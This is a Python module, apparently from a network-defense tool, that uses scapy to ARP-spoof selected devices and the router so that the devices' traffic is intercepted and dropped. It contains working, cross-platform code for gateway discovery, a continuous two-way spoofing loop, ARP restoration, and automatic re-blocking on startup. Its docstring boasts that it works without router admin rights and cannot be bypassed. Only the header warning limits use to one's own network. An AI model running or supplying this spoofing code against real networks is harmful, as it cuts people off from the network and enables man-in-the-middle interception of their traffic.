#!/usr/bin/env python3
"""
Network Device Blocker - Active Network Defense
Uses ARP Spoofing to block devices from network access

⚠️ WARNING: This is an active attack technique!
Only use on YOUR OWN NETWORK for security purposes.
Blocking devices you don't own is illegal.
"""

import threading
import time
from datetime import datetime
import json
import os

try:
    # Optional dependency: scapy is required only when device blocking is enabled
    from scapy.all import ARP, Ether, sendp, conf, get_if_hwaddr  # type: ignore[import]
    SCAPY_AVAILABLE = True
except ImportError:
    # Provide safe fallbacks so type checkers don't treat these as unbound
    ARP = Ether = sendp = conf = get_if_hwaddr = None  # type: ignore[assignment]
    SCAPY_AVAILABLE = False
    print("[WARNING] Scapy not available for device blocking")

# Global state
_blocked_devices = {}  # {mac: {'ip': ip, 'gateway': gateway, 'blocker_thread': thread}}
_blocker_lock = threading.Lock()
_blocker_running = True

# Persistent storage
BLOCKED_DEVICES_FILE = os.path.join(os.path.dirname(__file__), 'json', 'blocked_devices.json')

def _save_blocked_devices():
    """Save blocked devices to disk"""
    try:
        os.makedirs(os.path.dirname(BLOCKED_DEVICES_FILE), exist_ok=True)
        # Only save MAC, IP, and timestamp (threads can't be serialized)
        persistent_data = {
            mac: {'ip': info['ip'], 'blocked_at': info['blocked_at']}
            for mac, info in _blocked_devices.items()
        }
        with open(BLOCKED_DEVICES_FILE, 'w') as f:
            json.dump(persistent_data, f, indent=2)
    except Exception as e:
        print(f"[WARNING] Could not save blocked devices: {e}")

def _load_blocked_devices():
    """Load blocked devices from disk and re-establish blocks"""
    try:
        if os.path.exists(BLOCKED_DEVICES_FILE):
            with open(BLOCKED_DEVICES_FILE, 'r') as f:
                data = json.load(f)
            print(f"[BLOCKER] Loaded {len(data)} previously blocked devices")
            return data
    except Exception as e:
        print(f"[WARNING] Could not load blocked devices: {e}")
    return {}


class DeviceBlocker:
    """
    Active network blocker using ARP Spoofing
    
    How it works:
    1. Finds the gateway (router) IP and MAC
    2. Sends fake ARP responses to the blocked device
    3. Tells the device that YOUR machine is the gateway
    4. Intercepts all traffic and drops it (no forwarding)
    5. Device thinks it has internet but packets go nowhere
    
    This is MORE POWERFUL than router blocking because:
    - Works even if you're not the router admin
    - Can't be bypassed by the device
    - Active defense against potential threats
    """
    
    def __init__(self):
        self.gateway_ip = None
        self.gateway_mac = None
        self.local_mac = None
        self._find_gateway()
    
    def _find_gateway(self):
        """Find the network gateway (router) - cross-platform"""
        if not SCAPY_AVAILABLE:
            print("[BLOCKER] Scapy not available - device blocking disabled")
            return
            
        try:
            import subprocess
            import platform
            import re
            from scapy.all import ARP, Ether, srp  # type: ignore[import]
            
            # Get default gateway based on OS
            system = platform.system()
            
            if system == "Linux":
                # Linux: use 'ip route' command
                try:
                    result = subprocess.check_output(['ip', 'route'], stderr=subprocess.DEVNULL).decode()
                    for line in result.split('\n'):
                        if 'default' in line:
                            parts = line.split()
                            if len(parts) >= 3:
                                self.gateway_ip = parts[2]
                                break
                except FileNotFoundError:
                    # Fallback to 'route' command if 'ip' not available
                    result = subprocess.check_output(['route', '-n'], stderr=subprocess.DEVNULL).decode()
                    for line in result.split('\n'):
                        if line.startswith('0.0.0.0'):
                            parts = line.split()
                            if len(parts) >= 2:
                                self.gateway_ip = parts[1]
                                break
                                
            elif system == "Windows":
                # Windows: use 'route print' command
                result = subprocess.check_output(['route', 'print'], stderr=subprocess.DEVNULL).decode()
                for line in result.split('\n'):
                    if '0.0.0.0' in line and 'On-link' not in line:
                        parts = line.split()
                        # Find the gateway IP (usually third column after 0.0.0.0)
                        if len(parts) >= 3:
                            potential_gw = parts[2]
                            # Validate it's an IP address
                            if re.match(r'^\d+\.\d+\.\d+\.\d+$', potential_gw):
                                self.gateway_ip = potential_gw
                                break
                                
            elif system == "Darwin":  # macOS
                result = subprocess.check_output(['route', '-n', 'get', 'default'], stderr=subprocess.DEVNULL).decode()
                for line in result.split('\n'):
                    if 'gateway:' in line:
                        self.gateway_ip = line.split(':')[1].strip()
                        break
            
            if not self.gateway_ip:
                print(f"[ERROR] Could not find gateway IP on {system}")
                print("[BLOCKER] Device blocking disabled (gateway not detected)")
                return
            
            # Get gateway MAC via ARP
            arp = ARP(pdst=self.gateway_ip)
            ether = Ether(dst="ff:ff:ff:ff:ff:ff")
            packet = ether/arp
            
            conf.verb = 0  # type: ignore
            result = srp(packet, timeout=3, retry=2)[0]
            
            if result:
                self.gateway_mac = result[0][1].hwsrc
                # Get local interface MAC
                try:
                    self.local_mac = get_if_hwaddr(conf.iface)  # type: ignore
                except Exception:
                    # Fallback: try to get any interface MAC
                    try:
                        import netifaces  # type: ignore[import]
                        interfaces = netifaces.interfaces()
                        for iface in interfaces:
                            try:
                                self.local_mac = get_if_hwaddr(iface)  # type: ignore
                                if self.local_mac and self.local_mac != "00:00:00:00:00:00":
                                    break
                            except:
                                continue
                    except ImportError:
                        self.local_mac = "00:00:00:00:00:00"
                
                print(f"[BLOCKER] Gateway: {self.gateway_ip} ({self.gateway_mac})")
                print(f"[BLOCKER] Local MAC: {self.local_mac}")
                print(f"[BLOCKER] Device blocking ready")
            else:
                print("[ERROR] Could not find gateway MAC via ARP")
                print("[BLOCKER] Device blocking disabled (gateway MAC not found)")
        
        except Exception as e:
            print(f"[ERROR] Gateway detection failed: {e}")
            print("[BLOCKER] Device blocking disabled")
    
    def block_device(self, ip, mac):
        """
        Block a device using ARP spoofing
        
        This sends continuous fake ARP packets telling the device:
        "I am the gateway" - so all traffic comes to us instead
        Then we drop the packets (don't forward them)
        
        Result: Device loses internet access
        """
        if not SCAPY_AVAILABLE:
            print("[ERROR] Scapy not available - cannot block devices")
            return False
        
        if not self.gateway_ip or not self.gateway_mac:
            print("[ERROR] Gateway not found - cannot block devices")
            return False
        
        with _blocker_lock:
            if mac in _blocked_devices:
                print(f"[BLOCKER] Device {mac} already blocked")
                return True
            
            # Create blocker thread
            blocker_thread = threading.Thread(
                target=self._arp_spoof_loop,
                args=(ip, mac),
                daemon=True
            )
            
            _blocked_devices[mac] = {
                'ip': ip,
                'gateway': self.gateway_ip,
                'blocked_at': datetime.now().isoformat(),
                'blocker_thread': blocker_thread
            }
            
            blocker_thread.start()
            _save_blocked_devices()  # Persist to disk
            
            print(f"[BLOCKER] BLOCKING DEVICE: {ip} ({mac})")
            print(f"[BLOCKER] Method: ARP Spoofing (telling device we are gateway)")
            print(f"[BLOCKER] Effect: Device will lose internet access")
            
            return True
    
    def unblock_device(self, mac):
        """
        Unblock a device - restore normal network access
        
        Stops ARP spoofing and sends packets to restore correct gateway
        """
        with _blocker_lock:
            if mac not in _blocked_devices:
                print(f"[BLOCKER] Device {mac} not blocked")
                return True
            
            device_info = _blocked_devices[mac]
            ip = device_info['ip']
            
            # Send correct ARP to restore connection
            self._restore_arp(ip, mac)
            
            # Remove from blocked list
            del _blocked_devices[mac]
            _save_blocked_devices()  # Persist to disk

            print(f"[BLOCKER] UNBLOCKED DEVICE: {ip} ({mac})")
            print(f"[BLOCKER] Device should regain internet access")
            
            return True
    
    def _arp_spoof_loop(self, target_ip, target_mac):
        """
        Continuously send fake ARP packets to maintain the block
        
        Sends packets every 2 seconds telling the device we are the gateway
        """
        if not SCAPY_AVAILABLE:
            return
            
        from scapy.all import ARP, Ether, sendp  # type: ignore[import]
        
        print(f"[BLOCKER] Starting ARP spoof loop for {target_ip}")
        
        while _blocker_running and target_mac in _blocked_devices:
            try:
                # Create fake ARP packet
                # Tell target: "Gateway IP is at MY MAC address"
                arp_response = ARP(
                    op=2,  # is-at (ARP reply)
                    psrc=self.gateway_ip,  # Pretend to be gateway
                    pdst=target_ip,  # Send to target
                    hwsrc=self.local_mac,  # Our MAC (fake gateway)
                    hwdst=target_mac  # Target's MAC
                )
                
                # Send the packet
                sendp(Ether(dst=target_mac)/arp_response, verbose=0)
                
                # Also spoof gateway to intercept return traffic
                arp_to_gateway = ARP(
                    op=2,
                    psrc=target_ip,
                    pdst=self.gateway_ip,
                    hwsrc=self.local_mac,
                    hwdst=self.gateway_mac
                )
                sendp(Ether(dst=self.gateway_mac)/arp_to_gateway, verbose=0)
                
                # Sleep before next spoof packet
                time.sleep(2)
                
            except Exception as e:
                print(f"[ERROR] ARP spoof failed for {target_ip}: {e}")
                break
        
        print(f"[BLOCKER] Stopped ARP spoof loop for {target_ip}")
    
    def _restore_arp(self, target_ip, target_mac):
        """
        Send correct ARP packets to restore normal gateway connection
        """
        if not SCAPY_AVAILABLE:
            return
            
        from scapy.all import ARP, Ether, sendp  # type: ignore[import]
        
        try:
            # Send correct ARP: "Gateway is at REAL gateway MAC"
            correct_arp = ARP(
                op=2,
                psrc=self.gateway_ip,
                pdst=target_ip,
                hwsrc=self.gateway_mac,  # REAL gateway MAC
                hwdst=target_mac
            )
            
            # Send multiple times to ensure it sticks
            for _ in range(5):
                sendp(Ether(dst=target_mac)/correct_arp, verbose=0)
                time.sleep(0.1)
            
            print(f"[BLOCKER] Sent restoration ARP to {target_ip}")
            
        except Exception as e:
            print(f"[ERROR] ARP restoration failed: {e}")
    
    def get_blocked_devices(self):
        """Get list of currently blocked devices"""
        with _blocker_lock:
            return {
                mac: {
                    'ip': info['ip'],
                    'blocked_at': info['blocked_at']
                }
                for mac, info in _blocked_devices.items()
            }
    
    def stop_all(self):
        """Stop all blocking threads and restore connections"""
        global _blocker_running
        _blocker_running = False
        
        with _blocker_lock:
            blocked_macs = list(_blocked_devices.keys())
        
        for mac in blocked_macs:
            self.unblock_device(mac)
        
        print("[BLOCKER] All devices unblocked, threads stopped")


# Global blocker instance
blocker = DeviceBlocker() if SCAPY_AVAILABLE else None

# Restore previously blocked devices on startup
if blocker:
    _previously_blocked = _load_blocked_devices()
    if _previously_blocked:
        print(f"[BLOCKER] Restoring {len(_previously_blocked)} previously blocked devices...")
        for mac, info in _previously_blocked.items():
            blocker.block_device(info['ip'], mac)


def block_device(mac, ip):
    """Block a device from network access using ARP spoofing"""
    if not blocker:
        print("[ERROR] Device blocker not available")
        return False
    return blocker.block_device(ip, mac)


def unblock_device(mac, ip):
    """Unblock a device to restore network access"""
    if not blocker:
        print("[ERROR] Device blocker not available")
        return False
    return blocker.unblock_device(mac)


def get_blocked_devices():
    """Get list of blocked devices"""
    if not blocker:
        return {}
    return blocker.get_blocked_devices()


def is_device_blocked(mac):
    """Check if a device is currently blocked"""
    if not blocker:
        return False
    return mac in blocker.get_blocked_devices()
